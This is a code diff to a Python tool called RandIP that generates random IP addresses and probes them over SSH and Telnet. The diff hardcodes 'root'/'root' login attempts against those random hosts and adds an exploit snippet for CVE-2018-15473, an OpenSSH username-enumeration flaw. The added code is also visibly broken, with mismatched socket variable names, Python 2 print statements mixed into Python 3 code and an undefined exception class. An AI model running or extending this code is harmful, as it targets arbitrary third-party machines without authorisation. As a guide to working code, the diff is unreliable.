@@ -1,4 +1,4 @@
-#RandIP 1.0 Stable#
+#RandIP 1.1 Stable#
 #Random IP Generator with Socket, SSH, Telnet, and HTML Screenshot support.#
 #Report bugs including uncontained exceptions to blmvxer@gmail.com#
 import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess, sys
@@ -221,7 +221,7 @@ def SSHConnect():
 		starttime=time.clock()
 		SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 		try:
-			SSH.connect(address, username='root', password=p)
+			SSH.connect(address, username='root', password='root')
 			stdin, stdout, stderr = client.exec_command('ls')
 			for line in stdout:
 				print('... ' + line.strip('\n'))
@@ -233,6 +233,24 @@ def SSHConnect():
 			total=endtime-starttime
 			print('Possible username root based on enumeration exploit...or timeout...Check Manually!...')
 			print(total)
+		try:
+			print('Using CVE:2018-15473')
+			SSHsocket = socket.socket()
+			try:
+			    sock.connect((address, 22))#((args.hostname, args.port))
+			except socket.error:
+			    print '[-] Failed to connect'
+			transport = paramiko.transport.Transport(sock)
+			try:
+			    transport.start_client()
+			except paramiko.ssh_exception.SSHException:
+			    print '[-] Failed to negotiate SSH transport'
+			try:
+			    transport.auth_publickey('root', paramiko.RSAKey.generate(2048))
+			except InvalidUsername:
+			    print '[*] Invalid username'
+			except paramiko.ssh_exception.AuthenticationException:
+			    print '[+] Valid username'
 	except socket.timeout:
 		print((socket.timeout, '%s timeout SSH or SSH not accessible' % address))
 		g.append(address)
